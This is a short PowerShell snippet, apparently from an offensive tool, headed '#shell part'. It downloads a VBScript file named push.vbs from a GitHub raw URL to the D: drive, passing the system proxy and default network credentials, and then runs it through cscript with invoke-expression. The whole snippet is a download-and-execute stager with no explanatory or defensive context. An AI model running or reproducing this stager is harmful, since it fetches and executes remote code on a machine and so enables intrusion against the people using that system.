#shell part
$my_path="D:\push.vbs"
$url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/push.vbs';
$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C cscript "+$my_path
invoke-expression $command
